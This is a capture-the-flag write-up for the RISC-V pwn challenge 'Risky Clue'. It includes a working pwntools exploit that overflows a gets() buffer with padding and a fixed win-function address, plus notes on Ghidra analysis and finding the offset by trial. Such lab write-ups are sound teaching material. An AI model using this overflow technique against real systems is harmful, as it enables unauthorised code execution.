# Risky Clue
Pwn - 316 points

```python
from pwn import *

#p = process("./clue")

p = remote("ctf.ritsec.club", 30839)

#payload = b"A"*111

payload = b"letter\x00"
payload += b"A"*105
payload += p64(0x10448)


p.sendline(payload)

p.interactive()
```

This challenge was simply a buffer overflow to a win function. Unfortunately, the architecture is risc-v, so I had trouble with dynamic analysis.

![image](https://github.com/RPISEC/Writeups/assets/29514104/b5ad0519-1dd8-4c51-833a-c777f8fd1505)

Nevertheless, Ghidra will analyze risc-v for free:

![image](https://github.com/RPISEC/Writeups/assets/29514104/c4c88174-cc57-4ffc-b2c5-619bd8abf3a0)

![image](https://github.com/RPISEC/Writeups/assets/29514104/7e6b55c5-cecd-41d2-8bf8-2c73fe1f9276)

The binary uses `gets()`, so it is vulnerable to a buffer overflow.

The file has PIE disabled, so we can use the addresses directly from Ghidra.

![image](https://github.com/RPISEC/Writeups/assets/29514104/4d9055ba-f6c3-481e-8bfb-bc344d430a6d)

![image](https://github.com/RPISEC/Writeups/assets/29514104/d302f268-3193-4adb-b33c-23af3a2e1900)

We will use `0x10448` as the address to the win function.

Next, we just use to use an intricate guess and check to find the proper amount of padding. Without a debugger available, I kept writing A's until the program seg-faulted, at which point I knew that's where I was likely overwriting the return address. All that was left to do was to craft the final payload.

(I don't think you actually have to solve the riddle for the exploit to work, but I haven't verified that.)
